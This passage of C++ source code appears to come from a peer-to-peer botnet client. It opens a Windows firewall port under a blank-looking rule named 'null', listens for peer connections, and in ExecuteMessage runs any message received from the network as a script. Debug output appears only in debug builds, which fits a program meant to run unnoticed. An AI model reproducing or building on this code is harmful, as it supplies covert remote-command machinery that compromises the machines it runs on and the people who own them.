						Connection->GetSocketP()->Send(&Null, sizeof(Null));
					}
				}
			}
		}
		ConnectionList.GetItem(i)->Mutex.Release();
	}
}

VOID P2P2::Initialize(VOID){
	GenerateKeys();

	#ifndef _DEBUG
	BlackList.Add("127.*");		// Prevent connecting to yourself
	BlackList.Add("localhost"); //
	#endif

	INT Errors = 0;
	ListeningSocket.Create(SOCK_STREAM);
	ListeningSocket.EventSelect(FD_ACCEPT);
	FireWall FireWall;
	FireWall.OpenPort(Config::GetP2PPort(), NET_FW_IP_PROTOCOL_TCP, L"null");
	if(ListeningSocket.Bind(Config::GetP2PPort()) == SOCKET_ERROR)
		Errors++;
	else if(ListeningSocket.Listen(4) == SOCKET_ERROR)
		Errors++;

	if(!Errors){
		#ifdef _DEBUG
		dprintf("** P2P Listening successful (listening on port %d)\r\n", Config::GetP2PPort());
		#endif
		ConnectionMode = MODE_LINK;
	}else{
		#ifdef _DEBUG
		dprintf("** P2P Listening failed\r\n");
		#endif
		ConnectionMode = MODE_CLIENT;
	}
}

VOID P2P2::ExecuteMessage(PCHAR Message){
	SEL::Script* Script = new SEL::Script(Message);
	Script->Run();
	SEL::Scripts.Add(Script);
}